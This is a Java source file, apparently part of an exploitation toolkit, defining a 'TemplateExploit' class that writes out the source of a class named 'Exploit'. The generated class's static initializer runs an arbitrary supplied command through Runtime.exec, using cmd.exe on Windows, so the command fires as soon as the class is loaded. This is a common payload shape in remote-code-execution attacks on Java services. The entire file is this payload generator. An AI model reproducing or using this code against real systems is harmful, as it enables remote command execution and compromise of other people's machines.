package payloads;

public class TemplateExploit {

    private StringBuilder content = null;

    public TemplateExploit( String cmd ) {
        content = new StringBuilder();
        content.append("public class Exploit {\n");
        content.append("    public Exploit() {}\n");
        content.append("         static {\n");
        content.append("             try {\n");
        content.append("             String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")\n" +
                "                            ? new String[]{\"cmd.exe\",\"/c\", \""+cmd+"\"}: \n" +
                "                            new String[] {\""+cmd+"\"};\n" +
                "                            java.lang.Runtime.getRuntime().exec(cmds).waitFor();\n");
        content.append("             }catch (Exception e){\n" +
                "                        e.printStackTrace();\n" +
                "             }\n");
        content.append("         }\n");
        content.append("public static void main(String[] args) {\n" +
                "         Exploit ex = new Exploit();\n" +
                "}\n");
        content.append("}\n");
    }

    public StringBuilder getContent(){
        return this.content;
    }
}
